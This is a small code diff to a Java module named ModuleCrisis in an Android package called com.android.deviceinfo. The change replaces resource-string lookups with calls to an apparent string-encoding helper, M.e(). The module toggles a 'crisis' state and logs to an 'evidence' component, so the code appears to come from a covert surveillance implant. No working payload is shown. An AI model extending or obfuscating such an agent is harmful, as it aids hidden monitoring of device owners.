@@ -9,13 +9,13 @@
 
 package com.android.deviceinfo.module;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 
 public class ModuleCrisis extends BaseModule {
@@ -38,13 +38,13 @@ public class ModuleCrisis extends BaseModule {
 	@Override
 	public void actualStart() {
 		Status.self().startCrisis();
-		EvidenceReference.info(Messages.getString("8_0")); //$NON-NLS-1$
+		EvidenceReference.info(M.e("Crisis started")); //$NON-NLS-1$
 	}
 
 	@Override
 	public void actualStop() {
 		Status.self().stopCrisis();
-		EvidenceReference.info(Messages.getString("8_2")); //$NON-NLS-1$
+		EvidenceReference.info(M.e("Crisis stopped")); //$NON-NLS-1$
 	}
 
 	@Override
